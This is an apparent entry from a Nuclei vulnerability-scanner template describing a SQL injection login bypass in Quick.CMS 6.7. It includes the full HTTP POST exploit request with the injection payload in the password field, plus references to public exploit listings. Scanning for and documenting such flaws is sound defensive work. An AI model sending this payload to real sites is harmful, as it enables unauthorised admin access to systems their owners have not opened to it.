# Nuclei Template: Quick.CMS v6.7 - SQL Injection
**Template ID:** quick-cms-sqli
**Vulnerability Class:** SQL Injection
**Severity:** High
**CWE:** CWE-89
**Source:** Nuclei Template (`quick-cms-sqli.yaml`)

## Vulnerability Information & PoC

## Description
Quick.CMS version 6.7 suffers from a remote SQL injection vulnerability that allows for authentication bypass.

## Steps to reproduce / Exploit Payload
```http
POST /admin.php?p=login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

sEmail=test%40test.net&sPass=%27+or+1%5D%2500&bAcceptLicense=1&iAcceptLicense=true
```

## References
- https://packetstormsecurity.com/files/177657/Quick.CMS-6.7-SQL-Injection.html
- https://www.exploit-db.com/exploits/51910
